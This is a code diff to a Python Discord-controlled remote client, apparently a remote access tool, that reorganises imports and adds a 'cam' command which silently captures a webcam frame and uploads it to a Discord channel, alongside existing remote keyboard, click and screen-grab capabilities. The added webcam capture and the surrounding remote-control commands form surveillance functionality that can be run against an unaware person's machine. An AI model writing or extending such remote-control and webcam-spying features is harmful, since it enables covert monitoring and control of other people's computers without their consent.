@@ -1,17 +1,25 @@
-import traceback
-import requests
-import discord, socket, os, subprocess, shutil, webbrowser, aiohttp
-from PIL import ImageGrab
-from io import BytesIO
 import asyncio
 import functools
-import time
-import dotenv
+import os
 import platform
+import shutil
+import socket
+import subprocess
+import time
+import traceback
+import webbrowser
 from datetime import datetime
-import yaml
-from playsound import playsound
+from io import BytesIO
+import tempfile
+import aiohttp
+import discord
+import dotenv
 import pyautogui
+import requests
+import yaml
+from PIL import ImageGrab
+from playsound import playsound
+import cv2
 
 # Dirs and other useless stuff start here!
 
@@ -86,6 +94,15 @@ async def hotkey(client: discord.Client, message: discord.Message, args: str):
 async def specialKeys(client: discord.Client, message: discord.Message, args: str):
     await message.reply("\n".join(pyautogui.KEY_NAMES))
 
+async def cam(client:discord.Client, message:discord.Message, args:str):
+    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as temp:
+        o = cv2.VideoCapture(0)
+        s, img = o.read()
+        cv2.imwrite(temp.name, img)
+        await message.channel.send(file=discord.File(temp.name))
+        o.release()
+        temp.close()
+        os.unlink(temp.name)
 
 async def loc(client: discord.Client, message: discord.Message, args: str):
     if len(message.attachments) == 0:
@@ -344,6 +361,7 @@ class RemoteClient(discord.Client):
             "special": specialKeys,
             "loc": loc,
             "click": click,
+            "cam":cam,
         }
 
     async def on_ready(self):
